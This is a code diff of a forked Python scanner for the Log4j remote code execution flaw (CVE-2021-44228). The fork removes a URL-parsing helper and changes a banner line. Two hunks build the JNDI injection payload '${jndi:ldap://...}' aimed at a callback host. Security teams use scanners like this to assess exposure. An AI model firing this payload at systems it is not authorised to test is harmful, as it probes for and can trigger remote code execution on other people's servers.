@@ -13,7 +13,6 @@ import random
 import requests
 import time
 import sys
-from urllib import parse as urlparse
 import base64
 import json
 import hashlib
@@ -37,7 +36,7 @@ except Exception:
 
 cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
 cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
-cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
+cprint('[•] Fork created by Sergey Egorov.', "yellow")
 
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
@@ -278,35 +277,10 @@ class Interactsh:
                          }
         return new_log_entry
 
-
-def parse_url(url):
-    """
-    Parses the URL.
-    """
-
-    # Url: https://example.com/login.jsp
-    url = url.replace('#', '%23')
-    url = url.replace(' ', '%20')
-
-    if ('://' not in url):
-        url = str("http://") + str(url)
-    scheme = urlparse.urlparse(url).scheme
-
-    # FilePath: /login.jsp
-    file_path = urlparse.urlparse(url).path
-    if (file_path == ''):
-        file_path = '/'
-
-    return({"scheme": scheme,
-            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
-            "host":  urlparse.urlparse(url).netloc.split(":")[0],
-            "file_path": file_path})
-
 def scan_test_host(url, callback_host, logfile):
     
     cprint(f"[•] Checking Test Host {url}", "yellow")
-    parsed_url = parse_url(url)
-    identifier = hashlib.md5(parsed_url["host"].encode('utf-8')).hexdigest()[:5]
+    identifier = hashlib.md5(url.encode('utf-8')).hexdigest()[:5]
     payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
     payloads = [payload]
     
@@ -393,8 +367,7 @@ def run_scan(url, payload, logfile):
             cprint(f"EXCEPTION: {e}")
 
 def scan_url(url, callback_host, logfile):
-    parsed_url = parse_url(url)
-    identifier = hashlib.md5(parsed_url["host"].encode('utf-8')).hexdigest()[:5]
+    identifier = hashlib.md5(url.encode('utf-8')).hexdigest()[:5]
     payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
     payloads = [payload]
 
